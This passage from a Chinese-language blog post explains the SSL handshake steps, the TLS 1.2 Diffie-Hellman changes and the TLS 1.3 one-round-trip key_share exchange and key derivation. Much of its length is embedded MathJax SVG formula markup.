1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="TeXAtom" transform="translate(510,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(529,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.748ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 2098.4 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="msup" transform="translate(1252.3,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.748ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 2098.4 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="msup" transform="translate(1323.1,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g></svg></mjx-container>因为群是乘法交换的。</li></ol><h3 id="SSL协议的流程"><a href="#SSL协议的流程" class="headerlink" title="SSL协议的流程"></a>SSL协议的流程</h3><p><a href="https://blog.nsfocus.net/tls1-3/">绿盟科技文章</a></p><p>SSL（Secure Sockets Layer）协议是为确保在计算机网络中进行安全通信而设计的加密协议。SSL协议在传输层之上，应用层之下</p><ul><li>第一步：client向server发出hello，并生成一个随机数random_A，将使用的SSL协议版本、加密算法、压缩方法以及random_A发送给服务端。</li><li>第二步：<ul><li>server向client回应hello，并生成一个随机数random_B，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。并将random_B发送给client</li><li>server向client发送自己的证书用于身份验证</li><li>server向client发送hellodone表示密钥协商阶段结束</li></ul></li><li>第三步：<ul><li>client验证服务器证书的有效性。通常，客户端会验证证书是否由受信任的CA签发，证书是否过期，证书链是否完整等。</li><li>client如果发送了证书，也会通过签名证明其证书的有效性。</li><li>client生成一个随机数random_C，client会使用证书中取出来的公钥对random_C进行加密，生成预主密钥，客户端以Client Key Exchange报文作为回应，其中包含预主密钥。</li><li>client继续发送Change Cipher Spec报文。用于告知server，client已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了。</li><li>client发送Finished报文。该报文包含连接至今全部报文的整体校验值（也就是HASH值），用来供server校验。</li></ul></li><li>第四步：<ul><li>server接收到客户端的请求之后，使用私钥解密报文，把Pre-master secret取出来。接着，同样发送Change Cipher Spec报文。</li><li>server同样发送Finished报文，用来供client校验。</li><li>此时双方建立起SSL连接，开始使用HTTP通讯</li></ul></li></ul><img src="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/Snipaste_2024-06-28_22-31-58.jpg" class=""><h3 id="TLS协议"><a href="#TLS协议" class="headerlink" title="TLS协议"></a>TLS协议</h3><p><a href="https://www.cnblogs.com/enoc/p/tls-handshake.html">一篇讲的很好的博客</a></p><p>网景公司针对传输层协议（TCP/UDP）并没有对传输的数据进行加密保护的缺陷，为自家浏览器设计了SSL协议，于1995年公开协议的2.0版本。1999年，IETF小组基于SSL 3.0设计了与SSL协议独立的TLS 1.0协议，正式成为互联网传输层加密的标准。</p><p>SSL/TLS提供了两种功能：</p><ul><li>建立一个安全的连接：对其中传输的数据提供加密保护，防止被中间人嗅探到可见明文；对数据提供完整性校验，防止传输的数据被中间人修改。</li><li>建立一个可信的连接：对连接双方的实体提供身份认证。</li></ul><h4 id="TLS1-2"><a href="#TLS1-2" class="headerlink" title="TLS1.2"></a>TLS1.2</h4><p>其实就是修复了一些安全漏洞，然后将SSL（security socket layer）换了个名字TLS（transport layer security），具体流程和SSL类似。</p><p>这里讲一下基于DH算法的握手流程的改动</p><ul><li>在证书中，不再是服务端的RSA公钥，而是DH中的p,g以及服务端的公钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="7.351ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 3249.3 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(863.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1741.3,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(2226.3,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(2746.3,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>。</li><li>客户端在进行密钥协商时不再返回加密后的预主密钥，而是返回<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="7.511ex" height="2.034ex" role="img" focusable="false" viewBox="0 -694 3320.1 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mi" transform="translate(934.1,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1812.1,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(2297.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(2817.1,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>。</li></ul><img src="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/Snipaste_2024-06-28_22-33-44.jpg" class=""><h4 id="TLS1-3"><a href="#TLS1-3" class="headerlink" title="TLS1.3"></a>TLS1.3</h4><p><a href="https://blog.nsfocus.net/tls1-3protocol/">绿盟博客TLS1.3详解</a></p><p>TLS1.3总共有两层，分别是握手协议(handshake protocol)和记录协议(record protocol)，握手协议在记录协议的上层，记录协议是一个分层协议。其中握手协议中还包括了警告协议(alert protocol)。</p><h6 id="往返时延上的改进"><a href="#往返时延上的改进" class="headerlink" title="往返时延上的改进"></a>往返时延上的改进</h6><p>我们先来简单回忆一下 Client 的密钥在 1.3 前的 DH(E) 算法下是怎么进行协商的：</p><ol><li>Client -&gt; Server：请求建立连接</li><li>Server -&gt; Client：生成 𝑏 并计算出 𝐵 发向对方</li><li>Client -&gt; Server：生成 𝑎 并计算出 𝐴 发向对方</li><li>双方根据 𝑎⋅𝐵 或 𝑏⋅𝐴 计算出密钥 𝐾</li></ol><p>在客户端和服务器之间进行了两次往返（2-RTT）以完成握手。 平均而言，这需要0.25秒到0.5秒之间的时间。</p><p>在这里我们可以看出 Client 向 Server 发送密钥是在收到 Server 的响应后的，这是因为密钥计算需要 𝑝 和 𝑔 ，而他们又在 Server 的证书里或被证书所签名，所以需要等到收到 Server 证书后才能计算。也就是说，只要我们能够提前得知 𝑝、𝑔 ，就能在第一个握手时就发送 𝐴。</p><p><strong>TLS1.3 在握手上做了优化，只需要一次时延往返就可以建立连接（1-RTT）</strong></p><p>那么它是怎么做的呢？</p><p>其实具体的做法还是利用了扩展。客户端在 <code>Client Hello</code> 消息里直接用 <strong>supported_groups</strong> 带上支持的曲线，比如 P-256、x25519，用 <strong>key_share</strong> 带上曲线对应的客户端公钥参数，用 <strong>signature_algorithms</strong> 带上签名算法。</p><p>服务器收到后在这些扩展里选定一个曲线和参数，再用 <code>key_share</code> 扩展返回服务器这边的公钥参数，就实现了双方的密钥交换。</p><h6 id="握手流程"><a href="#握手流程" class="headerlink" title="握手流程"></a>握手流程</h6><ol><li><p>Client 生成 𝑘𝑒𝑦𝑠ℎ𝑎𝑟𝑒向 Server 发送𝑘𝑒𝑦𝑠ℎ𝑎𝑟𝑒 的结构为一个列表，其中具有多个 &lt;密钥组名，通过<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.344ex" height="1.355ex" role="img" focusable="false" viewBox="0 -441 1036.3 598.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>和对应组使用的𝑝,𝑔生成的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.844ex" height="1.977ex" role="img" focusable="false" viewBox="0 -716 1257.3 873.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(783,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>&gt; 的数据项。</p><ul><li>为了安全起见，每一个数据项中的 𝑎 (Client 私钥) 都是不一样的</li><li>以上包含的多个组中并不只有 DHE 类型的组，还有 ECDHE 类型，其值中的加密组件所需参数不同</li></ul></li><li><p>Server 从多个密钥组中选择自己能够接受的密钥组；如果没有，则会直接响应自己能够接受的密钥组的组名，让 Client 重新生成对应的 𝐴 并发送（此时 1⋅𝑅𝑇𝑇 会退化为 2⋅𝑅𝑇𝑇 ）。</p><ul><li><p>在选定密钥组后，Server发送决定使用的密钥组的名称，同时使用该组的 𝑝,𝑔 和自己的𝑏计算出𝐵，紧接着根据密钥交换原理通过收到的𝐴计算出𝐾。</p></li><li><p>这里有个被忽略的过程，<a href="https://www.cnblogs.com/enoc/p/tls-handshake.html">这篇文章</a>讲了，非常感谢。在将”服务器端随机数”和 B𝐵 发送出去后，接下来，将通过 K𝐾 导出以下三个密钥：</p><ul><li>𝑚𝑎𝑠𝑡𝑒𝑟 𝑠𝑒𝑐𝑟𝑒𝑡 ：主密钥</li><li>客户端握手密钥：用来加密 Client -&gt; Server 的握手信息</li><li>服务器端握手密钥：用来加密 Server -&gt; Client 的握手信息</li></ul><p>导出密钥后，接下的所有要发送的信息都将被对应的密钥进行加密。对于每个被导出的密钥，所参与的参数与过程都存在不同，且该过程中会使用到 [客户端随机数] 和 [服务器端随机数]，这两参数的交换过程也被省略。</p><p><strong>导出的操作可理解为使用单向散列函数</strong>，以上导出的每个密钥中，参与导出的参数并不完全相同，所以导出的密钥的值也并不同的。</p></li></ul></li><li><p>Client 收到来自 Server 的服务器端随机数和公钥 𝐵 后，也进行以上的计算过程，并根据得出的”服务器端握手密钥”解密接下来收到的握手信息。</p><p>在解密并验证完被加密的证书后，就能确保服务器的身份。同时仍会验证发过来的握手阶段的报文的摘要，确认握手过程未被篡改。</p><p>在保证通信安全后，接下来会和 TLS 1.3 